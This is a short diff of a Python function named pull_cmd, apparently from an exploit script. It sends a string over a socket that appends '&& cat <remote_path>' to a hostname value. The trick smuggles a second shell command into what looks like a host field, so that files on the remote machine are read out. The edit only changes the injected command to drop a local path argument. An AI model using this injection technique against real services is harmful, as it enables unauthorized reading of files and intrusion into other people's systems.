@@ -62,7 +62,8 @@ def pull_cmd(remote_path, local_path):
 
     data = s.recv(1024)
 
-    formatt_cmd = "www.google.com && cat " + str(remote_path) + " " + str(local_path) + "\n"
+    #formatt_cmd = "www.google.com && cat " + str(remote_path) + " " + str(local_path) + "\n"
+    formatt_cmd = "www.google.com && cat " + str(remote_path) + "\n";
 
     s.send(formatt_cmd)
 
